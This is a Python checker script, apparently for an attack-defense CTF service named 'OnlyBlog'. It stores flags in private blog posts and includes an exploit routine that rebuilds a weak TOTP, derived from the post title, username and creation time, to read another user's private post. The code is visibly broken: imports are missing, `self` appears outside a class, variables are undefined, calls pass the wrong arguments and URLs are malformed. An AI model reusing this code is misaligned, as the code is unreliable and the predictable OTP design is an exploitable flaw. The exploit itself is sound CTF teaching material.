import json
import os
import re
import secrets
import string
import subprocess
from itertools import zip_longest
from logging import LoggerAdapter
from typing import List, Optional, Tuple
from bs4 import BeautifulSoup
from datetime import timezone
import datetime

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage,
)
from enochecker3.utils import FlagSearcher, assert_equals, assert_in
from httpx import AsyncClient, Request

"""

"""
SERVICE_PORT = 5000
checker = Enochecker("OnlyBlog", SERVICE_PORT)
app = lambda: checker.app
"""

"""

class Totp_Client:
    def __init__(self,
                 init_time,
                 num_digits: int=6):

        self.secret_key = ""
        self.init_time = init_time
        self.timestep = 30
        self.timestep_counter = 0
        if num_digits > 10 or num_digits < 6:
            raise ValueError("The number of digits for the OTP must be between 6 and 10")
        self.num_digits = num_digits

    def generate_shared_secret(self, secret: str=""):
        if not secret:
            if not self.secret_key:
                secret_phrase = "Hier könnte Ihr Geheimnis stehen!"
                secret_key_tmp = hashlib.sha256(self.secret_phrase.encode())
                self.secret_key = secret_key_tmp.digest()
        else:
            if not self.secret_key:
                secret_key_tmp = hashlib.sha256(secret.encode())
                self.secret_key = secret_key_tmp.digest()
        return

    def force_secret_override(self, new_secret):
        secret_key_tmp = hashlib.sha256(new_secret.encode())
        self.secret_key = secret_key_tmp.digest()
        return

    def generate_otp(self, shared_secret: bytes, timestep_counter: int):
        hmac_result = hmac.new(shared_secret, bytes(self.timestep_counter), hashlib.sha1)
        bin_code = self.truncate(bytearray(hmac_result.digest()))
        return int(bin_code) % 10**self.num_digits

    #return 4 byte/31 bit value
    def truncate(self, hmac_result: bytearray):
        offset = hmac_result[-1] & 0xf
        bin_code = ( (hmac_result[offset] & 0x7f) << 24
                    |(hmac_result[offset+1] & 0xff) << 16
                    |(hmac_result[offset+2] & 0xff) << 8
                    |(hmac_result[offset+3] & 0xff)
                    )
        return bin_code

    def calculate_current_timestep_count(self):
        dt = datetime.datetime.now(timezone.utc)
        time_diff = int(dt.timestamp()) - int(self.init_time) # floor the diff or fllor individually?
        steps = int(time_diff/self.timestep)
        self.timestep_counter = steps
        return


async def register_user(task, client: AsyncClient, logger):
    username = ''.join(secrets.choice(string.ascii_letters+string.digits) for i in range(10))
    password = ''.join(secrets.choice(string.ascii_letters+string.digits) for i in range(25))
    secret = ''.join(secrets.choice(string.ascii_letters+string.digits) for i in range(25))

    logger.debug(f"New user registration. Username: {username}, Password: {password}")
    url = "http://"+ task.address + ':' + str(SERVICE_PORT) + "/auth/register"
    formdata = {"username": username, "password": password, "rpassword": password, "secret phrase": secret}
    r = await client.post("/auth/register", data=formdata)
    assert_equals(r.status_code, 302, "Registration error in register user function.")
    return username, password, secret

async def login_user(task, client, logger, username, password):
    logger.debug(f"Logging in user: {username}, with password: {password}")
    formdata = {"username": username, "password": password}
    r = await client.post("auth/login", data=formdata)
    assert_equals(r.status_code, 302, "Login Error in login_user function.")
    return r.cookies

async def create_blogpost(cookie, flag, is_private):
    title = ''.join(secrets.choice(string.ascii_letters+string.digits) for i in range(25))
    body = flag
    if is_private:
        private = "True"
        formdata = {"title": title, "body": body, "private": private}
    else:
        formdata = {"title": title, "body": body}

    r = await client.post("/create", data=formdata, cookies=cookie)

    html = BeautifulSoup(r.text, "html.parser")
    article = html.find('article', attrs={"class":"post"})
    el_a = article.find('a', attrs={"class":"action"})
    postid = el_a['href'].split('/')[1]

    assert_equals(r.status_code, 302, "Blogpost creation error in create_blogpost function.")
    return title, postid

@checker.putflag(0)
async def putflag_zero(
    task: PutflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> str:
    """
    TODO:
        - register a user and store credentials
        - login as user with valid username, password and totp
        - create a new blogpost with a valid title, put the flag as the body and make it private
        - logout
    """
    flag = task.flag
    username, password, secret = await register_user(task, client, logger)
    cookie = await login_user(task, client, logger, username, password)
    title, postid = await create_blogpost(cookie, flag, True) #True makes blogpost private

    await db.set("nec_info", (username, password, secret, title, postid))
    attackinfo = {"title": title, "postid": postid}
    return json.dumps(attackinfo)

@checker.getflag(0)
async def getflag_zero(
    task: GetflagCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB
) -> None:
    """
    TODO:
        - retrieve valid credentials from DB
        - login as the user and access the desired post
        - retrieve the flag from the posts body
    """
    try:
        userdata = await db.get("nec_info")
    except KeyError:
        #is mumble here correct or will lead to deduction in points?
        raise MumbleException("Missing database entry from putflag operation.")
    cookie = await login_user(task, client, userdata['username'], userdata['password'])
    url ="/auth/accessblogpost/" + userdata['postid']
    r = await client.get(url, cookies=cookie)
    #assert_equals()
    assert_in(task.flag, r.text, "The flag could not be retrieved in the getflag method.")
    return

def find_params(r, username, postid):
    html = BeautifulSoup(r.text, "html.parser")
    el_article = html.find_all('article', attrs={"class":"post"})
    for article in el_article:
        el_div = article.find("div", attrs={"class":"about"})
        spliddy = el_div.string.split(' ')
        name = spliddy[1]
        time = spliddy[-1]
        if name == username:
            el_a = article.find('a', attrs={"class":"action"})
            post_id = el_a['href'].split('/')[-1]
            if str(postid) == str(post_id):
                return time
            else:
                continue
    raise MumbleException("post could not be found")

def convert_str_to_unixtimestamp(timestr: str):
    date, timec = timestr.split(' ', 1)
    datecomp=date.split('-')
    timec = timec.split('.', 1)[0]
    timecomp=timec.split(':')
    #create new aware datetime object from date and time components
    dto = datetime.datetime(int(datecomp[0]), int(datecomp[1]), int(datecomp[2]), int(timecomp[0]), int(timecomp[1]), int(timecomp[2]), tzinfo=timezone.utc)
    print("returning")
    return dto.timestamp()

@checker.exploit(0)
async def exploit_zero(task: ExploitCheckerTaskMessage,
                       searcher: FlagSearcher,
                       client: AsyncClient
                       ) -> Optional[str]:
    """
    TODO:
        - register a new user
        - login as the new user with valid credentials and totp
        - access the private event by
            - reading the creation time and creating a timestamp from it
            - generating the secret key
            - calculating the totp.
    """
    if task.attack_info == "":
        raise InternalErrorException("Missing attack info")
    attackinfo = task.attack_info
    title = attackinfo['title']
    postid = attackinfo['postid']

    username, password, secret = await register_user(task, client)
    cookie = await login_user(task, client, username, password)

    url = "http://" + task.address + str(SERVICE_PORT) + "/"
    r = await client.get(url, cookies=cookie)

    time = find_params(r, username, postid)
    timestamp = convert_str_to_unixtimestamp(time)
    postkey = title + username
    totp_device = Totp_Client(init_time=timestamp)
    totp_device.generate_shared_secret(postkey)
    totp_device.calculate_current_timestep_count()
    usercode = totp_device.generate_otp(self.secret_key, self.timestep_counter)

    url = url + "auth/accessblogpost/postid"
    r = await client.post(url, json={"code":usercode}, cookies=cookie)
    assert_equals(r.status_code, 200, "Wrong status code in exploit function, @totp")
    assert_in(task.flag, r.text, "flag was not found in blogpost")
    return
